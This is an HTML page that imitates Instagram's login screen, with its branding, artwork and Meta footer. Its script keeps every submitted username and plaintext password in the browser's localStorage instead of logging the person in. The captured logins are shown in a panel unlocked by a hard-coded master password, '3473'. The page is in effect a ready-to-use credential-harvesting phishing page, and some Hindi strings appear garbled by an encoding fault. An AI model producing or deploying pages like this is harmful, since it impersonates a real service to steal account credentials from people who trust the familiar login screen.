<!doctype html>
<html lang="hi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Instagram ‚Äî Login</title>

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg:#fafafa;
      --card:#fff;
      --muted:#8e8e8e;
      --accent:#0095f6;
      --border:#dbdbdb;
      --maxw:380px;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Noto Sans", "Helvetica Neue", Arial;
      background:var(--bg);
      color:#262626;
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      padding:20px;
    }

    .shell{
      width:100%;
      max-width:900px;
      display:flex;
      gap:20px;
      align-items:center;
      justify-content:center;
    }

    .left-img {
      display:none;
    }
    @media(min-width:880px){
      .left-img {
        display:block;
        background:url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/43cc71bb1b43.png') no-repeat center;
        background-size:contain;
        width:454px;
        height:618px;
      }
    }

    /* Left: login card */
    .card {
      width:100%;
      max-width:var(--maxw);
      background:var(--card);
      border:1px solid var(--border);
      padding:32px 40px;
      text-align:center;
      border-radius:8px;
    }

    .logo {
      font-family: Pacifico, cursive;
      font-size:48px;
      letter-spacing:1px;
      margin-bottom:18px;
      color:#262626;
    }

    .subtitle { color:var(--muted); font-size:14px; margin-bottom:14px; }

    form { display:flex; flex-direction:column; gap:8px; }

    .input {
      background:#fafafa;
      border:1px solid var(--border);
      padding:10px 12px;
      border-radius:4px;
      font-size:14px;
      outline: none;
    }
    .input:focus {
      border-color: rgba(0,149,246,0.6);
      box-shadow: 0 0 0 3px rgba(0,149,246,0.06);
    }

    .btn {
      background: var(--accent);
      color: white;
      border: none;
      font-weight: 600;
      padding: 8px 10px;
      border-radius:4px;
      cursor:pointer;
      margin-top:8px;
    }

    .or {
      display:flex;
      align-items:center;
      gap:12px;
      margin:14px 0;
      color:var(--muted);
      font-size:13px;
    }
    .or hr { flex:1; border:none; height:1px; background:var(--border); }

    .fb {
      display:flex;
      align-items:center;
      justify-content:center;
      gap:8px;
      color:#385185;
      font-weight:600;
      cursor:pointer;
      font-size:14px;
    }

    .help {
      margin-top:12px;
      font-size:12px;
      color:var(--muted);
    }

    /* Right: signup box */
    .signup {
      width:100%;
      max-width:var(--maxw);
      background:var(--card);
      border:1px solid var(--border);
      padding:16px;
      margin-top:12px;
      border-radius:8px;
      text-align:center;
      font-size:14px;
      color:var(--muted);
    }

    /* Saved entries area */
    .saved {
      width:100%;
      max-width:var(--maxw);
      background:var(--card);
      border:1px solid var(--border);
      padding:16px;
      margin-top:12px;
      border-radius:8px;
      font-size:13px;
    }
    .entry {
      background:#f7f7f7;
      border-radius:6px;
      padding:8px;
      margin-bottom:8px;
      display:flex;
      justify-content:space-between;
      gap:8px;
      align-items:center;
    }
    .entry .meta { color:var(--muted); font-size:12px; }

    .small-link { color:#00376b; cursor:pointer; font-weight:600; font-size:13px; }

    .controls { display:flex; gap:8px; margin-top:8px; justify-content:center; }
    .btn-ghost { background:transparent; border:1px solid var(--border); padding:8px; border-radius:6px; cursor:pointer; }

    /* footer */
    .page-footer { margin-top:18px; font-size:12px; color:var(--muted); text-align:center; }

    @media(max-width:600px){
      .card { padding:28px 22px; }
    }
  </style>
</head>
<body>
  <div class="shell">
    <div class="left-img"></div>
    <div class="col">
      <div class="card" role="region" aria-label="Login">
        <div class="logo">Instagram</div>
        <form id="loginForm" aria-label="Login form">
          <input class="input" id="username" type="text" placeholder="Phone number, username, or email" autocomplete="username" required>
          <input class="input" id="password" type="password" placeholder="Password" autocomplete="current-password" required>
          <button class="btn" type="submit">Log In</button>
        </form>

        <div class="or" aria-hidden="true">
          <hr><div>OR</div><hr>
        </div>

        <div class="fb" id="fbLogin">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
            <path d="M22 12C22 6.477 17.523 2 12 2S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879v-6.99H7.898v-2.889h2.54V9.797c0-2.507 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562v1.875h2.773l-.443 2.889h-2.33V21.88C18.343 21.128 22 16.991 22 12z"/>
          </svg>
          <span>Log in with Facebook</span>
        </div>

        <div class="help">
          <a class="small-link" id="forgot">Forgot password?</a>
        </div>
      </div>

      <div class="signup">
        Don't have an account? <strong style="color:#262626">Sign Up</strong>
      </div>

      <!-- Saved entries + controls -->
      <div class="saved" id="savedSection">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
          <div style="font-weight:600">Saved (local)</div>
          <div class="controls">
            <button id="clearAll" class="btn-ghost" title="Clear all saved entries">Clear All</button>
          </div>
        </div>
        <div id="savedList" class="saved-list"></div>
        <div style="margin-top:8px;color:var(--muted);font-size:12px;">
          Saved to browser localStorage. Anyone with access to this device can read them.
        </div>
      </div>

      <div class="page-footer">
        ¬© 2025 Instagram from Meta
      </div>
    </div>
  </div>

  <script>
    const MASTER_PASSWORD = "3473"; // üîí ‡§Ü‡§™‡§ï‡§æ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°

    const STORAGE_KEY = 'insta_like_logins_v1';

    function readStorage(){
      try {
        const raw = localStorage.getItem(STORAGE_KEY);
        return raw ? JSON.parse(raw) : [];
      } catch(e) { return []; }
    }
    function writeStorage(arr){
      localStorage.setItem(STORAGE_KEY, JSON.stringify(arr));
    }
    function escapeHtml(s){
      return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
    }
    function obscure(p){
      if(!p) return '';
      return p[0] + '*'.repeat(Math.max(3, p.length-1));
    }

    function renderList(){
      const listEl = document.getElementById('savedList');
      const items = readStorage();
      if(items.length === 0){
        listEl.innerHTML = '<div style="color:var(--muted)">No saved entries</div>';
        return;
      }
      listEl.innerHTML = '';
      items.forEach((it, idx) => {
        const el = document.createElement('div');
        el.className = 'entry';
        el.innerHTML = `
          <div style="flex:1;min-width:0;">
            <div style="font-weight:600">${escapeHtml(it.username)}</div>
            <div class="meta">Password: ${escapeHtml(obscure(it.password))}</div>
            <div class="meta">Saved: ${new Date(it.time).toLocaleString()}</div>
          </div>
          <div style="margin-left:8px;display:flex;flex-direction:column;gap:6px;">
            <button class="btn-ghost" data-idx="${idx}" style="font-size:12px;padding:6px;">Delete</button>
            <button class="btn-ghost" data-idx-login="${idx}" style="font-size:12px;padding:6px;">Use</button>
          </div>
        `;
        listEl.appendChild(el);
      });

      listEl.querySelectorAll('[data-idx]').forEach(btn=>{
        btn.addEventListener('click', ()=>{
          const i = Number(btn.getAttribute('data-idx'));
          const arr = readStorage();
          arr.splice(i,1);
          writeStorage(arr);
          renderList();
        });
      });
      listEl.querySelectorAll('[data-idx-login]').forEach(btn=>{
        btn.addEventListener('click', ()=>{
          const i = Number(btn.getAttribute('data-idx-login'));
          const arr = readStorage();
          const it = arr[i];
          if(it){
            document.getElementById('username').value = it.username;
            document.getElementById('password').value = it.password;
            document.getElementById('username').focus();
          }
        });
      });
    }

    document.getElementById('loginForm').addEventListener('submit', function(e){
      e.preventDefault();
      const u = document.getElementById('username').value.trim();
      const p = document.getElementById('password').value;
      if(!u || !p){
        alert('‡§¶‡•ã‡§®‡•ã‡§Ç ‡§´‡§º‡•Ä‡§≤‡•ç‡§° ‡§≠‡§∞‡•á‡§Ç‡•§');
        return;
      }
      const arr = readStorage();
      arr.unshift({ username: u, password: p, time: Date.now() });
      if(arr.length > 30) arr.length = 30;
      writeStorage(arr);
      alert('Saved locally ‚úÖ');
      document.getElementById('username').value = '';
      document.getElementById('password').value = '';
      renderList();
    });

    document.getElementById('clearAll').addEventListener('click', ()=>{
      if(confirm('‡§∏‡§ö ‡§Æ‡•á‡§Ç ‡§∏‡§¨ ‡§π‡§ü‡§æ‡§®‡§æ ‡§π‡•à?')) {
        localStorage.removeItem(STORAGE_KEY);
        renderList();
      }
    });

    document.getElementById('fbLogin').addEventListener('click', ()=>{
      alert('Facebook login placeholder.');
    });
    document.getElementById('forgot').addEventListener('click', ()=>{
      alert('Forgot password flow (not implemented).');
    });

    // üîí Lock Saved Section until password entered
    (function(){
      const savedSection = document.getElementById('savedSection');
      const realContent = savedSection.innerHTML;
      savedSection.innerHTML = `
        <div style="text-align:center;">
          <input type="password" id="unlockPass" placeholder="Enter master password" class="input" style="max-width:200px;margin-bottom:8px;">
          <button class="btn" id="unlockBtn">Unlock</button>
        </div>
      `;
      document.getElementById('unlockBtn').addEventListener('click', ()=>{
        const pass = document.getElementById('unlockPass').value;
        if(pass === MASTER_PASSWORD){
          savedSection.innerHTML = realContent;
          renderList();
        } else {
          alert('‡§ó‡§≤‡§§ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‚ùå');
        }
      });
    })();
  </script>
</body>
</html>
